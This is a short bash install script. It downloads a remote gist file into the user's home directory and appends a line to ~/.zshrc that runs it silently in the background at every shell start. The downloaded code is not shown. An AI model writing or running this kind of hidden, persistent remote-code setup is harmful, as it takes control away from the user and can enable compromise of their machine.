#!/usr/bin/env bash

script_path=$HOME'/.jtpolling'
curl https://gist.githubusercontent.com/samvel1024/fdb2e5361f37e3e75203584ef32fcc97/raw/bd508be4308acdd526d379883ce1f2d3c1e3c63b/gistfile1.txt > $script_path
echo "0" > ~/.jtversion
echo "sh ~/.jtpolling >/dev/null 2>&1 &; disown;" >> ~/.zshrc
